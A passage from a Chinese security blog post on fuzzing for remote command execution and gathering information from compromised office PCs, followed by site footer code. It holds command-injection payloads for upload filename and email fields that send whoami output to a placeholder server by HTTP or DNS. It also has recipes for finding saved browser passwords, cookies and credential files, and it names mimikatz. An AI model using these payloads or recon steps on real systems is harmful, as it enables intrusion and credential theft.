+<span class="o">(</span>获取计算机名<span class="o">)</span>
+<span class="k">for</span> /F %x <span class="k">in</span> <span class="o">(</span><span class="s1">'whoami'</span><span class="o">)</span> <span class="k">do </span>start http://服务器地址/%x
+<span class="nt">------</span>
+<span class="o">(</span>获取用户名称<span class="o">)</span>
+<span class="k">for</span> /F <span class="s2">"delims=</span><span class="se">\ </span><span class="s2">tokens=2"</span> %i <span class="k">in</span> <span class="o">(</span><span class="s1">'whoami'</span><span class="o">)</span> <span class="k">do </span>ping <span class="nt">-n</span> 1 %i.服务器地址
+<span class="nt">------</span>
+测试邮箱:<span class="sb">`</span>wget%209服务器地址/xxxx<span class="sb">`</span>@qq.com
+
+测试上传:<span class="sb">`</span><span class="nb">sleep </span>10<span class="sb">`</span>filename
+
+测试filenname:<span class="sb">`</span><span class="o">||</span>wget%20服务器地址<span class="sb">`</span>
+
+测试上传处下的名称: <span class="p">;</span>payload|payload&amp;payload
+<span class="p">;</span><span class="nb">whoami</span>|whoami&amp;whoami
+<span class="nt">------</span>
+</code></pre></div></div>
+
+<h1 id="个人机器信息收集">个人机器信息收集</h1>
+
+<ol>
+  <li>
+    <p>浏览器[Chrome,Firefox,Edge,IE,360,QQ ]信息(历史记录，密码，书签，cookie)：</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%LocalAppData%\Google\Chrome\User Data\Default
+%APPDATA%\Mozilla\Firefox\Profiles\xxxxxxxx.default\
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>机器内敏感文件，关键词：账号、密码、备份、登录、管理、邮箱、后台、资产、网络</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>for /r D:\ %i in (*密码*) do @echo %i
+for /r D:\ %i in (*vpn*) do @echo %i
+for /r D:\ %i in (*账号*) do @echo %i
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>机器进程</p>
+
+    <ul>
+      <li>杀软/edr</li>
+      <li>teamviewer/等远程管理工具</li>
+      <li>服务类进程：mssql/java/web服务</li>
+    </ul>
+  </li>
+  <li>
+    <p>安装软件列表</p>
+  </li>
+  <li>
+    <p>当前windows 凭证管理器存储的密码</p>
+
+    <ul>
+      <li>
+        <p>登录密码（mimikatz）</p>
+      </li>
+      <li>
+        <p>wifi密码</p>
+      </li>
+      <li>
+        <p>outlook密码</p>
+      </li>
+      <li>
+        <p>……</p>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <p>机器开放端口信息/防火墙信息/获取机器共享</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netstat -naop
+wmic share  get name,path,status  #利用wmic查找共享
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>获取机器所有rdp连接记录</p>
+  </li>
+  <li>
+    <p>获取所有盘符</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic logicaldisk where drivetype=3 get name,freespace,systemname,filesystem,volumeserialnumber,size #查看分区
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>获取全盘所有敏感文件</p>
+
+    <p>.doc\xlsx\md\sql\ppt*\txt</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>for /r D:\ %i in (*.doc) do @echo %i
+for /r D:\ %i in (*.xlsx) do @echo %i
+for /r D:\ %i in (*.ppt*)) do @echo %i
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>本地环境</p>
+    <ul>
+      <li>hosts</li>
+      <li>环境变量</li>
+      <li>补丁列表</li>
+      <li>当前主机的会话信息</li>
+    </ul>
+  </li>
+</ol>
+
+<p>工作不饱和 总结了一下个人办公机信息收集思路</p>
+
+                <!-- [x] 2022/10/20/10:49:36 fixed: while width < some inch. would be flex column not display like a row.-->
+<footer>
+	<style>.border-top {
+		border-top: 1.5px solid #d0d7de!important;
+	}</style>
+	<div class="border-top"></div>
+		<section class="container-xl mt-lg-8 mt-6 px-3 px-md-6 no-print mx-auto">
+			<div class="col-xs-4-5 pr-4 mb-8 px-md-6 container-xl mx-auto py-6 py-lg-6 clearfix ">
+				<h2 class="lead">申明</h2>
+				<div>
+					<div class="mb-2"><a href="/blog/2020/learn/to/fuzz/" target="_blank" class=" text-bold">
+						<div class="fa fa-link"></div>
+						转载请申明本文档链接</a></div>
+					<div><a href="https://github.com/Bin4xin" target="_blank"  class="text-bold">
+						<div class="fa fa-user"></div>
+						Post by Bin4xin.</a>
+					</div>
+				</div>
+			</div>
+			<div class="col-xs-4-5 pr-4 mb-8 px-md-6 container-xl mx-auto py-6 py-lg-6 clearfix">
+				<h2 class="lead">贡献开源文档</h2>
+				<div>
+					<a href="https://github.com/Bin4xin/bin4xin.github.io/tree/main/_posts/blog/2020-06-10-learn-to-fuzz.markdown" target="_blank" class="no-underline btn mr-1 color-border-accent-emphasis">
+						<svg aria-hidden="true" focusable="false" role="img" class="octicon mr-1" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" style="display: inline-block; user-select: none; vertical-align: text-bottom; overflow: visible;"><path fill-rule="evenodd" d="M7.177 3.073L9.573.677A.25.25 0 0110 .854v4.792a.25.25 0 01-.427.177L7.177 3.427a.25.25 0 010-.354zM3.75 2.5a.75.75 0 100 1.5.75.75 0 000-1.5zm-2.25.75a2.25 2.25 0 113 2.122v5.256a2.251 2.251 0 11-1.5 0V5.372A2.25 2.25 0 011.5 3.25zM11 2.5h-1V4h1a1 1 0 011 1v5.628a2.251 2.251 0 101.5 0V5A2.5 2.5 0 0011 2.5zm1 10.25a.75.75 0 111.5 0 .75.75 0 01-1.5 0zM3.75 12a.75.75 0 100 1.5.75.75 0 000-1.5z"></path></svg>
+						贡献当前开源文档
+					</a>
+					<p class="f0_8-l mt-2 text-bold">此之前，学习开源贡献<a target="_blank" href="https://github.com/Bin4xin/bin4xin.github.io/wiki/Git操作-Git如何贡献仓库代码">CN&nbsp;|</a>
+						<a target="_blank" href="https://github.com/github/docs/blob/main/CONTRIBUTING.md">EN</a></p>
+				</div>
+			</div>
+			<div class="col-xs-4-5 pr-4 mb-8 px-md-6 container-xl mx-auto py-6 py-lg-6 clearfix">
+				<h2 class="lead">此文档对您有帮助吗</h2>
+				<a href="https://github.com/Bin4xin/bin4xin.github.io/" target="_blank" class="no-underline">
+				<span class="btn mr-1 color-border-accent-emphasis" title="给文档仓库点个赞!">
+					<div class="fa fa-thumbs-o-up"></div>
+				</span>
+				</a>
+				<a href="https://github.com/Bin4xin/bin4xin.github.io/issues/new?labels=Service+Issue,research&template=2-bug_report.yaml&title=_posts/blog/2020-06-10-learn-to-fuzz.markdown&nbsp; 「Fuzz」:浅谈一些模糊匹配搜集信息的技巧 | © 哨兵 | SENTINEL SECURITY, LAB" target="_blank">
+				<span class="btn mr-1 color-border-accent-emphasis" title="本文档有问题?">
+				<div class="fa fa-thumbs-o-down"></div>
+				</span>
+				</a>
+			</div>
+		</section>
+</footer>
+            </div>
+            <div class="spacing"></div>
+        </div><!--/col-lg-8 -->
+        
+<div class="col-md-4 ml-hide table-of-contents__left-border" style="max-height: 100%">
+    <div class="nav nav-stacked tableOfContents_35-E thin-scrollbar position-sticky top-0">
+        <li class=" table-of-contents">
+            <code-index-css>
+                <ul><li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column"><a>文章目录</a></li></ul>
+                <ul id="toc" class="section-nav">
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h1"><a href="#服务器rce的fuzz技巧">服务器RCE的fuzz技巧</a>
+<ul>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2"><a href="#linux下正常测试rce">Linux下正常测试rce:</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2"><a href="#windows探测">Windows探测:</a></li>
+</ul>
+</li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h1"><a href="#个人机器信息收集">个人机器信息收集</a></li>
+</ul>
+            </code-index-css>
+        </li>
+    </div>
+</div>
+
+    </div><!--/row -->
+</div><!--/container -->
+                <!-- 代码引用申明/code reference declaration:
+#############################################################################
+## code from cloudflare. visit footer in https://www.cloudflare.com/zh-cn/ ##
+#############################################################################
+-->
+
+<div id="footerwrap" class="hidden-print">
+    <div class="footer-container">
+        <div class="pt3 pt3-ns pt3-m pt7-l pb0 pb0-ns pb0-m pb5-l">
+            <div class="footer-row">
+                
+<div class="footer-col-lg-2">
+    <details class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l" open>
+        <summary class="fw6 mt0 flex justify-between mb0 mb0-ns mb0-m mb1-l lh-copy f2 f2-ns f2-m f3-l ">
+            <span class="footer-abstract point"><strong>入门</strong></span>
+        </summary>
+        <ul class="db db-ns db-m db-l ma0 pa0 mt2 mt2-ns mt2-m mt0-l list">
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="/usage/" target="_blank">快速开始</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="/blog/2019/jekyll/in/linux/" target="_blank">博客搭建</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="/blog/2019/nginx/with/jekyll-site/" target="_blank">公网部署</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/tuna/mirror-web/" target="_blank">Jekyll Tuna源码</a></li>
+            
+            
+        </ul>
+    </details>
+</div>
+
+<div class="footer-col-lg-2">
+    <details class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l" open>
+        <summary class="fw6 mt0 flex justify-between mb0 mb0-ns mb0-m mb1-l lh-copy f2 f2-ns f2-m f3-l ">
+            <span class="footer-abstract point"><strong>社区</strong></span>
+        </summary>
+        <ul class="db db-ns db-m db-l ma0 pa0 mt2 mt2-ns mt2-m mt0-l list">
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/Bin4xin/bigger-than-bigger/" target="_blank">Bigger than Bigger</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/Bin4xin/bigger-than-bigger/tree/master/CoVV" target="_blank">Collection Of Verified Vulnerabilities</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/Bin4xin/sweet-ysoserial" target="_blank">sweet-ysoserial</a></li>
+            
+            
+        </ul>
+    </details>
+</div>
+
+<div class="footer-col-lg-2">
+    <details class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l" open>
+        <summary class="fw6 mt0 flex justify-between mb0 mb0-ns mb0-m mb1-l lh-copy f2 f2-ns f2-m f3-l ">
+            <span class="footer-abstract point"><strong>技术栈</strong></span>
+        </summary>
+        <ul class="db db-ns db-m db-l ma0 pa0 mt2 mt2-ns mt2-m mt0-l list">
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://jekyllrb.com/docs/" target="_blank">Jekyll</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://www.markdownguide.org/" target="_blank">MarkDown</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://www.cloudflare.com/waf/" target="_blank">CloudFlare WAF</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://dash.cloudflare.com/dns/" target="_blank">CloudFlare CDN</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/features/actions" target="_blank">Github Action</a></li>
+            
+            
+        </ul>
+    </details>
+</div>
+
+<div class="footer-col-lg-2">
+    <details class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l" open>
+        <summary class="fw6 mt0 flex justify-between mb0 mb0-ns mb0-m mb1-l lh-copy f2 f2-ns f2-m f3-l ">
+            <span class="footer-abstract point"><strong>关于</strong></span>
+        </summary>
+        <ul class="db db-ns db-m db-l ma0 pa0 mt2 mt2-ns mt2-m mt0-l list">
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="/about/" target="_blank">近期研究</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="/blog/" target="_blank">博客</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/Bin4xin/bin4xin.github.io/wiki" target="_blank">WIKI</a></li>
+            
+            
+        </ul>
+    </details>
+</div>
+
+<div class="footer-col-lg-2">
+    <details class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l" open>
+        <summary class="fw6 mt0 flex justify-between mb0 mb0-ns mb0-m mb1-l lh-copy f2 f2-ns f2-m f3-l ">
+            <span class="footer-abstract point"><strong>贡献者</strong></span>
+        </summary>
+        <ul class="db db-ns db-m db-l ma0 pa0 mt2 mt2-ns mt2-m mt0-l list">
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/bin4xin" target="_blank">本阿信</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/dnf-2008" target="_blank">夏天の风</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/Yang2635" target="_blank">Yang2635</a></li>
+            
+            
+        </ul>
+    </details>
+</div>
+
+<div class="footer-col-lg-2">
+    <details class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l" open>
+        <summary class="fw6 mt0 flex justify-between mb0 mb0-ns mb0-m mb1-l lh-copy f2 f2-ns f2-m f3-l ">
+            <span class="footer-abstract point"><strong>其他</strong></span>
+        </summary>
+        <ul class="db db-ns db-m db-l ma0 pa0 mt2 mt2-ns mt2-m mt0-l list">
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="/usage/" target="_blank">帮助</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="/privacy/" target="_blank">隐私</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="/privacy/#cookie" target="_blank">Cookie偏好</a></li>
+            
+            
+        </ul>
+    </details>
+</div>
+
+            </div><!-- "/row"-->
+            <!--TODO mark-->
+            <span class="btn mr-1 color-border-accent-emphasis" title="Under construction">
+					<div class="fa fa-bug">
+                        <div class="fa fa-hand-point-down"></div>
+                        <a href="https://github.com/Bin4xin/bin4xin.github.io/blob/main/.github/workflows/deploy.yml#L46" target="_blank">
+                        Clock counter Bug need to FIX.</a>
+                    </div>
+            </span>
+
+            <div class="pv2-ns">
+                <div class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l flex footer-bottom-row-margin">
+                    <!--
+   - FlipClock design
+   -    @link { https://github.com/objectivehtml/FlipClock }
+-->
+<link rel="stylesheet" href="/assets/flipclock/flipclock.css">
+<script src="/assets/flipclock/flipclock.js"></script>
+
+<div class="clock" style="margin-bottom:2em;margin-top:2em;"></div>
+<div class="flex items-center mb3 mb3-ns mb3-m mb0-l lh-1 mt0 mt3-ns" >
+    
+    
+    
+    <div id="SentinelLAB"><a class="lh-1 dib mr2" title="SentinelLAB" target="_blank" rel="noopener" href="https://www.vulbox.com/team/ERRORS"></a></div>
+    
+    
+    
+    <div id="YouTuBe"><a class="lh-1 dib mr2" title="YouTuBe" target="_blank" rel="noopener" href="https://www.youtube.com/@bin4xin"></a></div>
+    
+    
+    
+    <div id="Twitter"><a class="lh-1 dib mr2" title="Twitter" target="_blank" rel="noopener" href="https://twitter.com/bin4xin"></a></div>
+    
+    
+    
+    <div id="Linkedin"><a class="lh-1 dib mr2" title="Linkedin" target="_blank" rel="noopener" href="https://www.linkedin.com/#"></a></div>
+    
+    
+    
+    <div id="Facebook"><a class="lh-1 dib mr2" title="Facebook" target="_blank" rel="noopener" href="https://www.facebook.com/#"></a></div>
+    
+    
+    
+    <div id="Bilibili"><a class="lh-1 dib mr2" title="Bilibili" target="_blank" rel="noopener" href="https://space.bilibili.com/67373868"></a></div>
+    
+</div>
+<!--
+  - Ajax @para counts
+  - Jquery-return-value-undefined @link { https://stackoverflow.com/questions/13848123/jquery-return-value-undefined }
+  -->
+<script>
+    function getGAJson() {
+        let counts = null
+        $.ajax({
+            url: 'https://bin4xin.sentrylab.cn/assets/ga.json',
+            dataType: 'json', // for cross-origin access
+            timeout: 1000 * 10, // 10 secs
+            async: false,
+            success: function(data) { counts = displayPageviews(data.rows); },
+            error: function() { console.log('Failed to load Pageviews!'); }
+        });
+        return counts;
+    }
+    function displayPageviews(rows) {
+        if (rows === undefined) { return; }
+        var curPath = window.location.pathname;
+        var curFile = curPath.slice(curPath.lastIndexOf('/') + 1); // Sometimes posts will be moved.
+        var len = rows.length;
+        var cnt = 0;
+
+        for (var i = 0; i < len; ++i) {
+            var gaPath = rows[i][0];
+            var gaFile = gaPath.slice(gaPath.lastIndexOf('/') + 1);
+
+            if (gaPath === curPath || gaFile === curFile) {
+                cnt += parseInt(rows[i][1]);
+            }
+        }
+        return setInitialCount(cnt);
+        // ref @link
+        //      - { https://cotes.page/posts/fetch-pageviews-from-google-analytics/#web-%E7%AB%AF%E5%A4%84%E7%90%86-ga-%E6%95%B0%E6%8D%AE }
+        //      - { https://taoalpha.github.io/blog/2015/06/07/tech-add-google-analytics-pageviews-to-jekyll-blog/ }
+    }
+    // <!-- @link { https://profile-counter.glitch.me/bin4xin.github.io/count.svg } -->
+    function setInitialCount(num) {
+        var init_SiteOffset = 66749;
+        _value_site_pv = parseInt(num)
+        all_counts = init_SiteOffset + _value_site_pv
+        return all_counts
+    }
+    var clock;
+    let All_Counts = getGAJson()
+    $(document).ready(function() {
+            // Instantiate a counter
+            clock = new FlipClock($('.clock'), All_Counts , {
+            clockFace: 'Counter'
+        });
+        // Attach a click event to a button an increment the clock
+        $('.increment').click(function() {
+            //clock.setValue(10); Or you could decrease the clock // clock.decrement();
+            clock.increment();
+            // Or set it to a specific value
+            // clock.setValue(x);
+        });
+        // Attach a click event to a button a decrement the clock
+        $('.decrement').click(function() {
+            clock.decrement();
+        });
+        $('.reset').click(function() {
+            clock.reset();
+        });
+    });
+</script>
+                </div>
+            </div><!-- "/pv5" -->
+        </div>
+    </div>
+    <div class="tertiary d-flex">
+        <div class="wrapper">
+            <div class="col justify-center flex-wrap-l d-flex justify-content-center">
+                <ul class="pa1 table-of-contents flex-xl-justify-between flex-xl-column">
+                    <li class="outstanding"><a>© 2019-2025 SENTRYLAB.CN</a></li>
+                    <li class="outstanding"><a>SENTINEL SECURITY, LAB</a></li>
+                    <li class="outstanding"><a>Jekyll Ver 3.9.3.</a></li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</div><!--/footerwrap -->
+
+    </body>
+
+    <script src="/assets/js/copy.js"></script>
+<!--TODONE.
+**FireFox display BUG**
+position-fixed in FireFox display position -> none
+- Reference:
+    - { @link https://developer.mozilla.org/zh-CN/docs/Web/CSS/position#browser_compatibility }
+    - { @link https://blog.csdn.net/DDD4V/article/details/123354124 }
+    - { @link https://juejin.cn/post/6844904100576886797 }
+        - { @link Demo https://codepen.io/li377242494/pen/VwLGGaR }
+Fiex In `[assets/css/style.scss](https://github.com/Bin4xin/bin4xin.github.io/blob/main/assets/css/style.scss)`
+    - tooltipped css postion.
+-->
+
+<!--<link rel="preload" href="https://bobbyhadz.com/_next/static/css/b9669d7c5a48325f.css" as="style"/>-->
+<!--<link rel="stylesheet" href="https://bobbyhadz.com/_next/static/css/b9669d7c5a48325f.css" data-n-g=""/>-->
+
+<divs role="tooltip" class="position-fixed bottom-0 mb-4 right-5 mr-4 z-1 transition-200 opacity-0" onclick="$(&quot;html,body&quot;).animate({scrollTop:0}, 1000);">
+    <button class="tooltipped tooltipped-n tooltipped-no-delay color-bg-accent-emphasis color-fg-on-emphasis circle border-0" style="width:45px;height:45px"
+            aria-label="滚动到顶部">
+        <svg aria-hidden="true" role="img" class="octicon octicon-chevron-up" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" style="display:inline-block;user-select:none;vertical-align:text-bottom;overflow:visible">
+            <path fill-rule="evenodd" d="M3.22 9.78a.75.75 0 010-1.06l4.25-4.25a.75.75 0 011.06 0l4.25 4.25a.75.75 0 01-1.06 1.06L8 6.06 4.28 9.78a.75.75 0 01-1.06 0z">
+            </path>
+        </svg>
+    </button>
+</divs>
+
+
+</html>
